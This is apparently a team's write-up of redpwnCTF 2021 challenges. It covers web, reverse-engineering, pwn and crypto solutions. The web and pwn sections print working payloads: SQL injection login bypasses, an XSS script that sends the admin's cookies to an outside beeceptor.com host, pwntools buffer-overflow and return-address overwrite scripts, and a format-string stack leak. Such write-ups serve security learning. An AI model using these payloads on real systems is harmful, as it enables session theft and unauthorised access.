# redpwnCTF 2021 Official Write-ups

Final position: 25th in College-only Scoreboard, 296th in Global Scoreboard | [Full Scoreboard here](https://2021.redpwn.net/scores)

**Disclaimer:** those are _our_ personal solutions, so feel free to contact us if you think your solution is better!

Done by:

- [Marco Gasperini](https://github.com/marcuz1996)

# Write Ups - Categories and Points

## Web

### web/inspect-me ![c](https://img.shields.io/badge/101_points-green)

#### Description

See if you can find the flag in the source code!

#### Solution

If you take a look at the source code of the thei site, it is easy to find the flag in an html comment.  
![Alt text](./img/inspect-me.png?raw=true "Title")  
**\*flag{inspect_me_like_123}**

### web/orm-bad ![c](https://img.shields.io/badge/102_points-green)

#### Description

I just learned about orms today! They seem kinda difficult to implement though... Guess I'll stick to good old raw sql statements!

#### Solution

analyzing the source code of this challenge the we quickly realize that this line was vulnerable:  
`db.all("SELECT * FROM users WHERE username='" + req.body.username + "' AND password='" + req.body.password + "'"`  
once inside thanks to this payload insert into the password field (`' OR 1=1-- `) the flag was revealed  
**\*flag{sqli_overused_again_0b4f6}**

### web/pastebin-1 ![c](https://img.shields.io/badge/103_points-green)

#### Description

Ah, the classic pastebin. Can you get the admin's cookies?

#### solution

if you open the link a box for memo appear.  
![Alt text](./img/pastebin1.PNG?raw=true "Title")  
When you input something and click on "create paste" an unique url for your note is created and is shown in the url in this way: `https://pastebin-1.mc.ax/view?id=aipjdvnswtuqgxky`  
There is also another link that is an admin form for sending them a report of a problem. We can exploit the fact that the admin view the link we send and through an xss exploitation we can redirect him to our site and steal his cookies.  
This is the payload used in this challenge:

```
<script>
cookies = document.cookie;
url = "https://redsite.free.beeceptor.com/" + cookies;
window.location.href = url;
</script>
```

and into our page in https://beeceptor.com/ we find the flag  
![Alt text](./img/pastebin2.PNG?raw=true "Title")  
**\*flag{d1dn7_n33d_70_b3_1n_ru57}**

### web/secure ![c](https://img.shields.io/badge/104_points-green)

#### Description

Just learned about encryption—now, my website is unhackable!

#### Solution

As the title says in this challenge we must take care about the encription, infact reading quickly at the source code we found this SQLinjection vulnerability

```
const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
```

but if we try to expoit it with the same payload as before we got an error.  
Thus we decide to use burp for a more detailed analysis. Using the interceptor we noticed that the two parameters (username and password) are converted in base64.  
![Alt text](./img/secure.PNG?raw=true "Title")  
the simplest way to solve this challenge was to change the two parameters directly using burp and inject the same payload as before `' OR 1=1-- ` and finally we are in and we take the flag!  
**\* flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}**

## Reverse

### rev/wstrings ![c](https://img.shields.io/badge/102_points-green)

#### Description

Some strings are wider than normal...

#### Solution

I open the binary file with gdb, I disassemble the main an finally I found a string comparison function.  
Thus I place a break point on `0x0000555555554874` where the function was invoked.  
![Alt text](./img/wstrings1.PNG?raw=true "Title")  
As you can see there is a comparison between two strings s1 and s2: s2 is my input while s1 is the flag.  
whit this command `x /100s 0x555555554938` I'm able to se the next 100 strings starting at that address in memory. That is the output:  
![Alt text](./img/wstrings2.PNG?raw=true "Title")  
**\*flag{n0t_all_str1ngs_ar3_sk1nny}**

## Pwn

### pwn/beginner-generic-pwn-number-0 ![c](https://img.shields.io/badge/105_points-green)

#### Description

rob keeps making me write beginner pwn! i'll show him...

#### Solution

This challenge is very simple. It is a buffer overflow.  
This was the source code:  
![Alt text](./img/beginner-generic-pwn-number-0.PNG?raw=true "Title")  
If we are able to overwrite the "inspirational_message_index" variable with 0xFFFFFFFF we win.  
Also the script is self-explanatory:

```
from pwn import *

r = remote ('mc.ax', 31199)

shellcode = b"\x41"*40 + b"\xff"*8
r.sendline(shellcode)
r.interactive()
```

thanks to a cat flag.txt we find the flag.
**\*flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}**

### pwn/ret2generic-flag-reader ![c](https://img.shields.io/badge/105_points-green)

#### Description

i'll ace this board meeting with my new original challenge!

#### Solution

This is the source code:  
![Alt text](./img/ret2generic-flag-reader.PNG?raw=true "Title")  
as you can see there is also now a buffer overflow but now we must change the saved return address with the address of the function that allows us to read the flag, so `void super_generic_flag_reading_function_please_ret_to_me()`.  
First of all we need to find the address of that function and to do that we can use gdb and disassamble our binary.  
The address we are looking for is `0x4011f6` while the padding for buffer overflow exploitation is 32+8.  
This is the script I use to solve the challenge:

```
from pwn import *

r = remote ('mc.ax', 31077)

address = 0x4011f6
shellcode = b"\x41"*40 + p64(address)
r.sendline(shellcode)
r.interactive()
```

**\*flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}**

### pwn/printf-please ![c](https://img.shields.io/badge/107_points-green)

#### Description

Be sure to say please...

#### Solution

This is the source code:  
![Alt text](./img/please.PNG?raw=true "Title")  
as you can see there is a format string vulnerability in line 31.  
The exploitation is very simple: we send in input "please" and a lot of %lx which print out the stuff on the stack.  
This is the input:

```
from pwn import *

r = remote ('mc.ax', 31569)
payload = b"please" + b"%lx-"*505
r.sendline(payload)
r.interactive()
```

and this is the output:

```
what do you say?
please7ffe84bd1946-7ffe84bd1b30-0-1-7f88abdf5500-6c25657361656c70-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-6c252d786c252d78-252d786c252d78-336c707b67616c66-6e3172705f337361-5f687431775f6674-5f6e303174756163-a7d6c78336139-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0- to you too!
```

First we need to remove the 'a' from the last block beacuse of the 0x0A (\n) and it becomes `7d6c78336139`.  
After HEX to ASCII conversion we get the flag in a 8 bytes-block reverse order:

```
.þ.½.F.þ.½.0...«ßU.l%esaelpl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-xl%-x%-xl%-x3lp{galfn1rp_3sa_ht1w_ft_n01tuac}lx3a9
```

**_flag{pl3as3_prn1tf_w1th_caut10n_9a3xl}_**

## Crypto

### crypto/scissor ![c](https://img.shields.io/badge/102_points-green)

#### Description

I was given this string and told something about scissors.
`egddagzp_ftue_rxms_iuft_rxms_radymf`

#### Solution

this is the source code:  
![Alt text](./img/scissor.PNG?raw=true "Title")  
If you try to run this script and give in input the given string, after some attempts you get the flag:  
![Alt text](./img/scissor2.PNG?raw=true "Title")  
**\*flag{surround_this_flag_with_flag_format}**

### crypto/baby ![c](https://img.shields.io/badge/102_points-green)

#### Description

I want to do an RSA!

#### Solution

The challenge give us three number:

```
n: 228430203128652625114739053365339856393
e: 65537
c: 126721104148692049427127809839057445790
```

It is a classic RSA exploitation and I solve it with this script:

```
from Crypto.Util.number import inverse
n = 228430203128652625114739053365339856393
e = 65537
c = 126721104148692049427127809839057445790


p = 12546190522253739887
q = 18207136478875858439

phi = (p-1)*(q-1)

d=inverse(e,phi)
m = pow(c,d,n)

print(bytes.fromhex(str(hex(m)[2:])).decode('utf-8'))
```

**\*flag{68ab82df34}**

### crypto/round-the-bases ![c](https://img.shields.io/badge/107_points-green)

#### Description

My flag has been all around the bases. Can you help me get it back?

#### Solution

To solve this challenge I made use of a usefull online tool: [CyberChef](https://gchq.github.io/CyberChef/)  
They give us this file:

```
9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:K0o09mTN[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN[9km7D9mTfc:..Zt9mTZ_:Jj8<
```

To solve the challenge we need to apply different transformation algorithm:

- base85
- base64
- hex
- decimal
- octal
- binary

![Alt text](./img/round-the-bases.PNG?raw=true "Title")

**\*flag{w0w_th4t_w4s_4ll_wr4pp3d_up}**
